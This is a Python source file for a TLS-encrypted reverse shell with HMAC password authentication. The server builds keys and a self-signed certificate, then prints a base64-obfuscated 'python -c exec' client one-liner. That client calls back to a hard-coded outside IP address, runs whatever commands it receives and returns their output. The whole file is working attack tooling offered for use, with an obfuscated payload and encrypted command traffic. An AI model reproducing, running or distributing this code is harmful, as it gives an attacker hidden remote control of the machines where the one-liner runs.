import os
import socket
import ssl
from subprocess import run, CalledProcessError
import base64
import hmac
import hashlib
from Crypto.PublicKey import RSA  # ensure pycryptodome is installed

def remove_existing_keys(keys_diriection):
    """
    Remove existing RSA keys if they exist
    """
    if os.path.exists(keys_diriection):
        for file in os.listdir(keys_diriection):
            file_path = os.path.join(keys_diriection, file)
            if os.path.isfile(file_path):
                os.remove(file_path)
        print("Existing keys removed.")
    else:
        os.makedirs(keys_diriection, exist_ok=True)
        print(f"Directory '{keys_diriection}' created.")

def generate_rsa_keys(keys_diriection):
    """
    Generate RSA keys and save them to the specified directory
    """
    key = RSA.generate(2048)
    
    private_key_path = os.path.join(keys_diriection, "private_key.pem")
    public_key_path = os.path.join(keys_diriection, "public_key.pem")
    
    # Save private key
    with open(private_key_path, "wb") as f:
        f.write(key.export_key())
    
    # Save public key
    with open(public_key_path, "wb") as f:
        f.write(key.publickey().export_key())
    
    print("RSA keys generated and saved.")
    return private_key_path, public_key_path

def generate_certificate(private_key_path, ip_add):
    """
    Generate a self-signed SSL certificate using the private key
    """
    openssl_config = "openssl.cnf"
    config_content = f"""
[ req ]
distinguished_name = wireless_security
x509_extensions = v3_req
prompt = no

[ wireless_security ]
C = ES
ST = Barcelona
L = Manresa
O = kg
OU = IT
CN = {ip_add}

[ v3_req ]
subjectAltName = @alt_names

[ alt_names ]
IP.1 = {ip_add}
"""
    
    # Create OpenSSL config file
    with open(openssl_config, "w") as f:
        f.write(config_content)
    
    certificate_path = os.path.join("keys", "server1.crt")
    
    try:
        # Run OpenSSL to generate the certificate
        run([
            "openssl", "req", "-new", "-x509",
            "-key", private_key_path,
            "-out", certificate_path,
            "-days", "400",
            "-config", openssl_config
        ], check=True)
        print("Certificate created successfully.")
    except CalledProcessError as e:
        print(f"[!!] OpenSSL Error Exit: {e}")
    finally:
        if os.path.exists(openssl_config):
            os.remove(openssl_config)

    return certificate_path

def c_client_code(ip, port, password):
    """
    Read the certificate that has been created
    """
    certfile = os.path.join("keys", "server1.crt")
    with open(certfile, "r") as f:
        auth_key = f.read()

    client_code = f"""
import socket, ssl, subprocess, hmac, hashlib
CERT=\"\"\"{auth_key}\"\"\" 

def connect(): 
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CERT)
    try:
        with socket.create_connection(("{ip}", {port})) as sock:
            with context.wrap_socket(sock, server_hostname="{ip}") as ssock:
                PASSWORD = b"{password}"
                # Authentication phase
                nonce = ssock.recv(16)
                hmac_res = hmac.new(PASSWORD, nonce, hashlib.sha256).digest()
                ssock.send(hmac_res) # sends to the server
                auth_status = ssock.recv(12)   #Authentication verification
                if auth_status != b"AUTH_SUCCESS":
                    raise Exception("Authentication failed")
                # Command loop
                while True:
                    cmd = ssock.recv(8192).decode() #Reads data from the secure (SSL) connection established with the server.
                    if cmd.lower() == "exit":
                        break
                    output = subprocess.getoutput(cmd)
                    ssock.sendall(output.encode())
    except Exception as e:
        print(f"Connection error: {{e}}")
connect()
"""
    return f"import base64;exec(base64.b64decode('{base64.b64encode(client_code.encode()).decode()}'))"

def handle_client(client_socket, password):
    """
    Handle client authentication and commands
    """
    try:
        # Send challenge
        nonce = os.urandom(16)
        client_socket.send(nonce)
        
        # Get response
        hmac_res = client_socket.recv(32)
        
        # Verify HMAC
        correct_hmac = hmac.new(password.encode(), nonce, hashlib.sha256).digest()
        if not hmac.compare_digest(hmac_res, correct_hmac):
            client_socket.send(b"AUTH_FAILED")
            raise Exception("Authentication failed")
        
        client_socket.send(b"AUTH_SUCCESS")
        print("[+] Client authenticated")
        
        # Command loop
        while True:
            cmd = input("Shell> ").strip()
            if not cmd:
                continue
            client_socket.send(cmd.encode())
            if cmd.lower() in ["exit", "quit"]:
                break
            output = client_socket.recv(8192).decode()
            print(output)
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

def start_server(ip, port, password):
    """
    Start server with authentication
    """
    # Generate RSA keys and certificate 
    cert, key = keys__check(ip, password)
    
    # Create an SSL context 
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    # Load the generated certificate and private key into the SSL context
    context.load_cert_chain(certfile=cert, keyfile=key)
    
    # Create a socket 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Bind the socket 
        sock.bind((ip, port))
        # Start listening for incoming connections
        sock.listen(5)
        print(f"[*] Listening on {ip}:{port}")
        
        # Wrap the socket with SSL/TLS 
        with context.wrap_socket(sock, server_side=True) as ssock:
            while True:
                # Accept an incoming connection from a client
                client, addr = ssock.accept()
                # Print the address of the client that has connected
                print(f"[+] Connection from {addr}")
                # Handle the client, passing the socket and password for authentication
                handle_client(client, password)



def keys__check(ip_add, password):
    """
    Full flow to generate RSA keys and a certificate
    """
    keys_diriection = "keys"
    
    # Remove any existing keys
    remove_existing_keys(keys_diriection)
    
    # Generate new RSA keys
    private_key_path, public_key_path = generate_rsa_keys(keys_diriection)
    
    # Create SSL certificate
    certificate_path = generate_certificate(private_key_path, ip_add)
    
    # Generate client code with password for the client to use
    client_code = c_client_code(ip_add, 9999, password)
    print("\n[** Start Client Code **]")
    print(f"python -c \"{client_code}\"")
    print("[** end the Client Code **]\n")

    return certificate_path, private_key_path

if __name__ == "__main__":
    server_ip = "178.62.237.181"  
    password = input("[!] Set authentication password: ").strip()
    start_server(server_ip, 9999, password)
